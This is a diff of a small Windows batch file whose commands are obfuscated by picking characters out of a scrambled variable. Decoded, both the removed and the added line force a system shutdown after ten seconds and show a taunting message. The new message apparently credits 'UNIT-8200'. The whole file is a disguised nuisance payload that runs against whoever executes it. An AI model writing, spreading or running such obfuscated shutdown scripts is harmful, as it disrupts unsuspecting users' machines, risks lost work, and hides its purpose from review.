@@ -1,4 +1,4 @@
 @echo off
-Set aozx=1xuNCri9jTIFdBQ7lKca6Pg3pSHsG2JY5vXqfOMhbEwkR0tnL4U8mWZeoVzDAy
+Set at4u=j10JyGSdF3WAhn9obHB2XtP5fxqmgOUvYuIcLwE4KQ6zMkZrasR8iNpTVDl7Ce
 cls
-%aozx:~27,1%%aozx:~39,1%%aozx:~2,1%%aozx:~46,1%%aozx:~12,1%%aozx:~56,1%%aozx:~42,1%%aozx:~47,1% -%aozx:~27,1% -%aozx:~46,1% %aozx:~0,1%%aozx:~45,1% -%aozx:~18,1% " %aozx:~31,1%%aozx:~56,1%%aozx:~2,1%%aozx:~5,1% %aozx:~18,1%%aozx:~56,1%%aozx:~52,1%%aozx:~24,1%%aozx:~2,1%%aozx:~46,1%%aozx:~55,1%%aozx:~5,1% %aozx:~6,1%%aozx:~27,1% %aozx:~56,1%%aozx:~47,1% %aozx:~46,1%%aozx:~39,1%%aozx:~55,1% %aozx:~42,1%%aozx:~19,1%%aozx:~61,1% %aozx:~46,1%%aozx:~56,1% %aozx:~39,1%%aozx:~55,1%%aozx:~16,1%%aozx:~16,1%. %aozx:~13,1%%aozx:~55,1%%aozx:~46,1%%aozx:~46,1%%aozx:~55,1%%aozx:~5,1% %aozx:~16,1%%aozx:~2,1%%aozx:~18,1%%aozx:~43,1% %aozx:~47,1%%aozx:~55,1%%aozx:~1,1%%aozx:~46,1% %aozx:~46,1%%aozx:~6,1%%aozx:~52,1%%aozx:~55,1% :-%aozx:~21,1% . "
+%at4u:~49,1%%at4u:~12,1%%at4u:~33,1%%at4u:~21,1%%at4u:~7,1%%at4u:~15,1%%at4u:~37,1%%at4u:~13,1% -%at4u:~49,1% -%at4u:~21,1% %at4u:~1,1%%at4u:~2,1% -%at4u:~35,1% " %at4u:~58,1%%at4u:~52,1%%at4u:~28,1%%at4u:~26,1%%at4u:~61,1%%at4u:~45,1%%at4u:~61,1%%at4u:~43,1%%at4u:~52,1%%at4u:~37,1%%at4u:~61,1% %at4u:~4,1%%at4u:~52,1%-%at4u:~30,1%%at4u:~53,1%%at4u:~34,1%%at4u:~55,1%-%at4u:~51,1%%at4u:~19,1%%at4u:~2,1%%at4u:~2,1% :-%at4u:~22,1% . "
